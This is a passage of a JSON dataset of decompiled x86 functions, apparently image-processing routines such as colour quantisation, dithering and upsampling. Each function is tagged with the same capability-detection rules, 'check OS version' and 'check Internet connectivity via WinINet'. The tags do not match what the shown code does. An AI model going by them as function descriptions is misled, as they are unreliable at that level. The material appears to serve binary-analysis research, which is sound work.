        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00438ac0(uchar *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_23ch;\n    uint8_t *var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uchar *var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0x7f;\n    puVar2 = &var_23ch;\n    var_ch = in_ECX;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    do {\n        *puVar2 = 0x7fffffff;\n        puVar2 = puVar2 + 1;\n        var_18h = var_18h + -1;\n    } while (-1 < var_18h);\n    var_18h = 0;\n    var_3ch = arg_ch;\n    if (0 < arg_10h) {\n        do {\n            var_1ch = *var_3ch;\n            piVar4 = *(var_4h + 0x88);\n            iVar1 = var_8h - *(*piVar4 + var_1ch);\n            iVar6 = var_ch - *(piVar4[1] + var_1ch);\n            iVar5 = iVar6 * 3;\n            iVar3 = arg_14h - *(piVar4[2] + var_1ch);\n            iVar7 = iVar3 * 2;\n            var_24h = iVar1 * iVar1 + iVar5 * iVar5 + iVar7 * iVar7;\n            var_34h = iVar6 * 0x48 + 0x90;\n            var_38h = iVar3 * 0x40 + 0x100;\n            piVar4 = &var_23ch;\n            var_20h = arg_8h;\n            var_2ch = iVar1 * 0x10 + 0x40;\n            var_10h = 3;\n            do {\n                var_28h = var_24h;\n                var_30h = var_34h;\n                var_14h = 7;\n                do {\n                    iVar1 = 3;\n                    iVar5 = var_38h;\n                    iVar7 = var_28h;\n                    do {\n                        if (iVar7 < *piVar4) {\n                            *piVar4 = iVar7;\n                            *var_20h = var_1ch;\n                        }\n                        iVar7 = iVar7 + iVar5;\n                        iVar5 = iVar5 + 0x200;\n                        piVar4 = piVar4 + 1;\n                        var_20h = var_20h + 1;\n                        iVar1 = iVar1 + -1;\n                    } while (-1 < iVar1);\n                    var_28h = var_28h + var_30h;\n                    var_30h = var_30h + 0x120;\n                    var_14h = var_14h + -1;\n                } while (-1 < var_14h);\n                var_24h = var_24h + var_2ch;\n                var_2ch = var_2ch + 0x80;\n                var_10h = var_10h + -1;\n            } while (-1 < var_10h);\n            var_18h = var_18h + 1;\n            var_3ch = var_3ch + 1;\n        } while (var_18h < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 954
    },
    "00438d18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438d18(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t in_EAX;\n    char **in_ECX;\n    uint8_t **in_EDX;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    int16_t *piVar9;\n    char **var_24h;\n    uint8_t **var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar3 = *(in_EAX + 0x70);\n    var_14h = 0;\n    var_24h = in_ECX;\n    var_20h = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar8 = *var_20h;\n            pcVar4 = *var_24h;\n            for (iVar5 = iVar3; iVar5 != 0; iVar5 = iVar5 + -1) {\n                uVar1 = *puVar8;\n                puVar6 = puVar8 + 1;\n                puVar7 = puVar8 + 2;\n                puVar8 = puVar8 + 3;\n                piVar9 = *(iVar2 + (uVar1 >> 3) * 4) + (*puVar6 >> 2) * 0x40 + (*puVar7 >> 3) * 2;\n                if (*piVar9 == 0) {\n                    fcn.00438c38(*puVar7 >> 3);\n                }\n                *pcVar4 = *piVar9 + -1;\n                pcVar4 = pcVar4 + 1;\n            }\n            var_14h = var_14h + 1;\n            var_24h = var_24h + 1;\n            var_20h = var_20h + 1;\n        } while (var_14h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "00438de4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00438de4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t in_EAX;\n    uint32_t uVar10;\n    int32_t *in_ECX;\n    uint32_t uVar11;\n    uint16_t *puVar12;\n    uint8_t **in_EDX;\n    uint32_t uVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t *var_70h;\n    uint8_t **var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint8_t *var_34h;\n    int16_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1cc);\n    iVar2 = *(iVar1 + 0x18);\n    iVar3 = *(in_EAX + 0x70);\n    iVar4 = *(in_EAX + 0x144);\n    iVar5 = *(iVar1 + 0x28);\n    iVar6 = **(in_EAX + 0x88);\n    iVar7 = *(*(in_EAX + 0x88) + 4);\n    iVar8 = *(*(in_EAX + 0x88) + 8);\n    var_48h = 0;\n    var_70h = in_ECX;\n    var_6ch = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            var_34h = *var_6ch;\n            var_38h = *var_70h;\n            if (*(iVar1 + 0x24) == 0) {\n                var_40h = 1;\n                var_44h = 3;\n                var_30h = *(iVar1 + 0x20);\n                *(iVar1 + 0x24) = 1;\n            }\n            else {\n                var_34h = var_34h + (iVar3 + -1) * 3;\n                var_38h = var_38h + iVar3 + -1;\n                var_40h = -1;\n                var_44h = -3;\n                var_30h = *(iVar1 + 0x20) + (iVar3 * 3 + 3) * 2;\n                *(iVar1 + 0x24) = 0;\n            }\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h = 0;\n            var_2ch = 0;\n            var_28h = 0;\n            var_24h = 0;\n            iVar14 = 0;\n            iVar16 = 0;\n            iVar18 = 0;\n            iVar9 = iVar3;\n            while( true ) {\n                if (iVar9 == 0) break;\n                uVar10 = *(iVar4 + *(iVar5 + (iVar18 + var_30h[var_44h] + 8 >> 4) * 4) + *var_34h);\n                uVar11 = *(iVar4 + *(iVar5 + (iVar16 + var_30h[var_44h + 1] + 8 >> 4) * 4) + var_34h[1]);\n                uVar13 = *(iVar4 + *(iVar5 + (iVar14 + var_30h[var_44h + 2] + 8 >> 4) * 4) + var_34h[2]);\n                iVar18 = uVar13 >> 3;\n                puVar12 = *(iVar2 + (uVar10 >> 3) * 4) + (uVar11 >> 2) * 0x40 + iVar18 * 2;\n                if (*puVar12 == 0) {\n                    fcn.00438c38(iVar18);\n                }\n                iVar18 = *puVar12 - 1;\n                *var_38h = iVar18;\n                iVar19 = uVar10 - *(iVar6 + iVar18);\n                iVar17 = uVar11 - *(iVar7 + iVar18);\n                iVar15 = uVar13 - *(iVar8 + iVar18);\n                *var_30h = var_24h + iVar19 * 3;\n                var_24h = var_18h + iVar19 * 5;\n                iVar18 = iVar19 * 7;\n                var_30h[1] = var_28h + iVar17 * 3;\n                var_28h = var_1ch + iVar17 * 5;\n                iVar16 = iVar17 * 7;\n                var_30h[2] = var_2ch + iVar15 * 3;\n                var_2ch = var_20h + iVar15 * 5;\n                iVar14 = iVar15 * 7;\n                var_34h = var_34h + var_44h;\n                var_38h = var_38h + var_40h;\n                var_30h = var_30h + var_44h;\n                iVar9 = iVar9 + -1;\n                var_20h = iVar15;\n                var_1ch = iVar17;\n                var_18h = iVar19;\n            }\n            *var_30h = var_24h;\n            var_30h[1] = var_28h;\n            var_30h[2] = var_2ch;\n            var_48h = var_48h + 1;\n            var_70h = var_70h + 1;\n            var_6ch = var_6ch + 1;\n        } while (var_48h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 1492
    },
    "004392c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004392c0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x73] = puVar2;\n    *puVar2 = 0x4391a4;\n    puVar2[3] = 0x4392b0;\n    puVar2[8] = 0;\n    puVar2[10] = 0;\n    if (in_EAX[0x1e] != 3) {\n        *(*in_EAX + 0x14) = 0x2f;\n        (***in_EAX)();\n    }\n    uVar3 = (**in_EAX[1])();\n    puVar2[6] = uVar3;\n    iVar4 = 0;\n    do {\n        uVar3 = (**(in_EAX[1] + 4))();\n        *(puVar2[6] + iVar4 * 4) = uVar3;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x20);\n    puVar2[7] = 1;\n    if (in_EAX[0x1b] == 0) {\n        puVar2[4] = 0;\n    }\n    else {\n        iVar4 = in_EAX[0x18];\n        if (iVar4 < 8) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x38;\n            *(iVar1 + 0x18) = 8;\n            (***in_EAX)();\n        }\n        if (0x100 < iVar4) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x39;\n            *(iVar1 + 0x18) = 0x100;\n            (***in_EAX)();\n        }\n        uVar3 = (**(in_EAX[1] + 8))(3);\n        puVar2[4] = uVar3;\n        puVar2[5] = iVar4;\n    }\n    if (in_EAX[0x16] != 0) {\n        in_EAX[0x16] = 2;\n    }\n    if (in_EAX[0x16] == 2) {\n        uVar3 = (**(in_EAX[1] + 4))();\n        puVar2[8] = uVar3;\n        fcn.004390e8();\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "004396ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004396ec(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iStack24 = 0;\n    iStack20 = *(in_EAX + 0xd8);\n    for (; iStack24 < *(in_EAX + 0x24); iStack24 = iStack24 + 1) {\n        uVar6 = *(iStack20 + 0xc) * *(iStack20 + 0x24);\n        iVar3 = uVar6 / *(in_EAX + 0x13c);\n        uVar5 = *(iStack20 + 0x2c) % uVar6;\n        if (uVar5 == 0) {\n            uVar5 = uVar6;\n        }\n        if (iStack24 == 0) {\n            *(iVar1 + 0x48) = (uVar5 - 1) / iVar3 + 1;\n        }\n        iVar2 = *(*(iVar1 + 0x38 + *(iVar1 + 0x40) * 4) + iStack24 * 4);\n        for (iVar4 = 0; SBORROW4(iVar4, iVar3 * 2) != iVar4 + iVar3 * -2 < 0; iVar4 = iVar4 + 1) {\n            *(iVar2 + (iVar4 + uVar5) * 4) = *(iVar2 + -4 + uVar5 * 4);\n        }\n        iStack20 = iStack20 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "00439818": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439818(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar3 = (**(*(in_EAX + 0x1ac) + 0xc))();\n        if (iVar3 == 0) {\n            return;\n        }\n        *(iVar1 + 0x30) = 1;\n    }\n    uVar2 = *(in_EAX + 0x13c);\n    (**(*(in_EAX + 0x1b0) + 4))(arg_8h, in_ECX);\n    if (uVar2 <= *(iVar1 + 0x34)) {\n        *(iVar1 + 0x30) = 0;\n        *(iVar1 + 0x34) = 0;\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00439890": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439890(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t *in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar2 = (**(*(in_EAX + 0x1ac) + 0xc))();\n        if (iVar2 == 0) {\n            return;\n        }\n        *(iVar1 + 0x30) = 1;\n        *(iVar1 + 0x4c) = *(iVar1 + 0x4c) + 1;\n    }\n    iVar2 = *(iVar1 + 0x44);\n    if (iVar2 != 0) {\n        if (iVar2 == 1) goto code_r0x0043994e;\n        if (iVar2 != 2) {\n            return;\n        }\n        (**(*(in_EAX + 0x1b0) + 4))(arg_8h, in_ECX, in_EDX, *(iVar1 + 0x48));\n        if (*(iVar1 + 0x34) < *(iVar1 + 0x48)) {\n            return;\n        }\n        *(iVar1 + 0x44) = 0;\n        if (arg_8h <= *in_ECX) {\n            return;\n        }\n    }\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x48) = *(in_EAX + 0x13c) + -1;\n    if (*(iVar1 + 0x4c) == *(in_EAX + 0x140)) {\n        fcn.004396ec();\n    }\n    *(iVar1 + 0x44) = 1;\ncode_r0x0043994e:\n    (**(*(in_EAX + 0x1b0) + 4))(arg_8h, in_ECX, in_EDX, *(iVar1 + 0x48));\n    if (*(iVar1 + 0x48) <= *(iVar1 + 0x34)) {\n        if (*(iVar1 + 0x4c) == 1) {\n            fcn.004395f0();\n        }\n        *(iVar1 + 0x40) = *(iVar1 + 0x40) ^ 1;\n        *(iVar1 + 0x30) = 0;\n        *(iVar1 + 0x34) = *(in_EAX + 0x13c) + 1;\n        *(iVar1 + 0x48) = *(in_EAX + 0x13c) + 2;\n        *(iVar1 + 0x44) = 2;\n    }\n    return;\n}\n",
        "token_count": 638
    },
    "004399d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004399d8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iStack28;\n    int32_t iStack20;\n    \n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x6a] = puVar1;\n    *puVar1 = 0x4397b0;\n    if (param_2 != 0) {\n        *(*in_EAX + 0x14) = 4;\n        (***in_EAX)();\n    }\n    if (*(in_EAX[0x71] + 8) == 0) {\n        iStack20 = in_EAX[0x4f];\n    }\n    else {\n        if (in_EAX[0x4f] < 2) {\n            *(*in_EAX + 0x14) = 0x2f;\n            (***in_EAX)();\n        }\n        fcn.004393e0();\n        iStack20 = in_EAX[0x4f] + 2;\n    }\n    iStack28 = 0;\n    iVar3 = in_EAX[0x36];\n    puVar1 = puVar1 + 2;\n    for (; iStack28 < in_EAX[9]; iStack28 = iStack28 + 1) {\n        uVar2 = (**(in_EAX[1] + 8))(((*(iVar3 + 0xc) * *(iVar3 + 0x24)) / in_EAX[0x4f]) * iStack20);\n        *puVar1 = uVar2;\n        puVar1 = puVar1 + 1;\n        iVar3 = iVar3 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 407
    },
    "0043a154": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043a154(void)\n\n{\n    int16_t *piVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iVar6 = *(in_EAX + 0x1ac);\n    uStack20 = 0;\n    if ((*(in_EAX + 0xdc) == 0) || (*(in_EAX + 0xa0) == 0)) {\n        uStack20 = 0;\n    }\n    else {\n        if (*(iVar6 + 0x70) == 0) {\n            uVar2 = (***(in_EAX + 4))();\n            *(iVar6 + 0x70) = uVar2;\n        }\n        piVar7 = *(iVar6 + 0x70);\n        iStack16 = *(in_EAX + 0xd8);\n        for (iVar6 = 0; iVar6 < *(in_EAX + 0x24); iVar6 = iVar6 + 1) {\n            piVar1 = *(iStack16 + 0x4c);\n            if (piVar1 == NULL) {\n                return 0;\n            }\n            if ((((*piVar1 == 0) || (piVar1[1] == 0)) || (piVar1[8] == 0)) ||\n               (((piVar1[0x10] == 0 || (piVar1[9] == 0)) || (piVar1[2] == 0)))) {\n                return 0;\n            }\n            piVar3 = *(in_EAX + 0xa0) + iVar6 * 0x100;\n            if (*piVar3 < 0) {\n                return 0;\n            }\n            iVar4 = 1;\n            piVar5 = piVar7;\n            do {\n                piVar5 = piVar5 + 1;\n                piVar3 = piVar3 + 1;\n                *piVar5 = *piVar3;\n                if (*piVar3 != 0) {\n                    uStack20 = 1;\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 6);\n            piVar7 = piVar7 + 6;\n            iStack16 = iStack16 + 0x54;\n        }\n    }\n    return uStack20;\n}\n",
        "token_count": 556
    },
    "0043aa34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043aa34(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puStack20;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1ac) = puVar1;\n    *puVar1 = 0x439b04;\n    puVar1[2] = 0x439b14;\n    puVar1[0x1c] = 0;\n    if (param_2 == 0) {\n        iVar6 = (**(*(in_EAX + 4) + 4))();\n        piVar4 = puVar1 + 8;\n        iVar5 = 0;\n        do {\n            iVar3 = iVar5 + 1;\n            *piVar4 = iVar5 * 0x80 + iVar6;\n            piVar4 = piVar4 + 1;\n            iVar5 = iVar3;\n        } while (iVar3 < 10);\n        puVar1[1] = 0x439d90;\n        puVar1[3] = 0x439b50;\n        puVar1[4] = 0;\n    }\n    else {\n        iVar5 = *(in_EAX + 0xd8);\n        puStack20 = puVar1 + 0x12;\n        for (iVar6 = 0; iVar6 < *(in_EAX + 0x24); iVar6 = iVar6 + 1) {\n            iVar3 = *(iVar5 + 0xc);\n            if (*(in_EAX + 0xdc) != 0) {\n                iVar3 = iVar3 * 3;\n            }\n            uVar2 = fcn.0043e4c8(iVar6, iVar3);\n            uVar2 = fcn.0043e4c8(uVar2);\n            uVar2 = (**(*(in_EAX + 4) + 0x14))(iVar3, uVar2);\n            *puStack20 = uVar2;\n            puStack20 = puStack20 + 1;\n            iVar5 = iVar5 + 0x54;\n        }\n        puVar1[1] = 0x439d94;\n        puVar1[3] = 0x439f84;\n        puVar1[4] = puVar1 + 0x12;\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "0043ac6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ac6c(uint noname_0, int32_t *arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1b0);\n    if (*(iVar1 + 0x18) == 0) {\n        uVar3 = (**(*(in_EAX + 4) + 0x1c))(1, *(iVar1 + 0x10));\n        *(iVar1 + 0xc) = uVar3;\n    }\n    uVar2 = *(iVar1 + 0x18);\n    (**(*(in_EAX + 0x1c4) + 4))(*(iVar1 + 0x10), iVar1 + 0x18, *(iVar1 + 0xc), arg_14h);\n    if (uVar2 < *(iVar1 + 0x18)) {\n        iVar4 = *(iVar1 + 0x18) - uVar2;\n        (**(*(in_EAX + 0x1cc) + 4))(iVar4);\n        *arg_ch = *arg_ch + iVar4;\n    }\n    uVar2 = *(iVar1 + 0x10);\n    if (uVar2 < *(iVar1 + 0x18) || uVar2 == *(iVar1 + 0x18)) {\n        *(iVar1 + 0x14) = *(iVar1 + 0x14) + uVar2;\n        *(iVar1 + 0x18) = 0;\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "0043ad10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ad10(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1b0);\n    if (*(iVar1 + 0x18) == 0) {\n        uVar2 = (**(*(in_EAX + 4) + 0x1c))(0, *(iVar1 + 0x10));\n        *(iVar1 + 0xc) = uVar2;\n    }\n    uVar4 = *(iVar1 + 0x10) - *(iVar1 + 0x18);\n    if (arg_8h - *arg_ch < uVar4) {\n        uVar4 = arg_8h - *arg_ch;\n    }\n    uVar3 = *(in_EAX + 0x74) - *(iVar1 + 0x14);\n    if (uVar3 < uVar4) {\n        uVar4 = uVar3;\n    }\n    (**(*(in_EAX + 0x1cc) + 4))(uVar4);\n    *arg_ch = *arg_ch + uVar4;\n    *(iVar1 + 0x18) = *(iVar1 + 0x18) + uVar4;\n    uVar4 = *(iVar1 + 0x10);\n    if (uVar4 < *(iVar1 + 0x18) || uVar4 == *(iVar1 + 0x18)) {\n        *(iVar1 + 0x14) = *(iVar1 + 0x14) + uVar4;\n        *(iVar1 + 0x18) = 0;\n    }\n    return;\n}\n",
        "token_count": 412
    },
    "0043ada8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ada8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1b0) = puVar1;\n    *puVar1 = 0x43ab48;\n    puVar1[2] = 0;\n    puVar1[3] = 0;\n    if (*(in_EAX + 0x54) != 0) {\n        puVar1[4] = *(in_EAX + 0x138);\n        if (param_2 == 0) {\n            uVar2 = (**(*(in_EAX + 4) + 8))(puVar1[4]);\n            puVar1[3] = uVar2;\n        }\n        else {\n            uVar2 = fcn.0043e4c8(*(in_EAX + 0x70) * *(in_EAX + 0x78));\n            uVar2 = (**(*(in_EAX + 4) + 0x10))(puVar1[4], uVar2);\n            puVar1[2] = uVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "0043b49c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b49c(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    uint8_t **in_ECX;\n    int32_t in_EDX;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint8_t **var_2ch;\n    int32_t *var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint8_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *arg_8h;\n    var_1ch = 0;\n    var_2ch = in_ECX;\n    while (var_1ch < *(in_EAX + 0x138)) {\n        var_20h = 0;\n        var_28h = iVar2 + var_1ch * 4;\n        do {\n            puVar3 = *var_2ch;\n            if (var_20h == 0) {\n                var_10h = var_2ch[-1];\n            }\n            else {\n                var_10h = var_2ch[1];\n            }\n            puVar4 = *var_28h;\n            var_1ch = var_1ch + 1;\n            var_28h = var_28h + 1;\n            iVar7 = *puVar3 * 3 + *var_10h;\n            iVar8 = puVar3[1] * 3 + var_10h[1];\n            var_10h = var_10h + 2;\n            puVar3 = puVar3 + 2;\n            *puVar4 = iVar7 * 4 + 8 >> 4;\n            puVar4[1] = iVar7 * 3 + iVar8 + 7 >> 4;\n            for (iVar6 = *(in_EDX + 0x28) + -2; puVar5 = puVar4 + 2,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                uVar1 = *var_10h;\n                var_10h = var_10h + 1;\n                iVar9 = *puVar3 * 3 + uVar1;\n                puVar3 = puVar3 + 1;\n                *puVar5 = iVar8 * 3 + iVar7 + 8 >> 4;\n                puVar4[3] = iVar8 * 3 + iVar9 + 7 >> 4;\n                iVar7 = iVar8;\n                iVar8 = iVar9;\n                puVar4 = puVar5;\n            }\n            *puVar5 = iVar8 * 3 + iVar7 + 8 >> 4;\n            puVar4[3] = iVar8 * 4 + 7 >> 4;\n            var_20h = var_20h + 1;\n        } while (var_20h < 2);\n        var_2ch = var_2ch + 1;\n    }\n    return;\n}\n",
        "token_count": 737
    },
    "0043b5f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
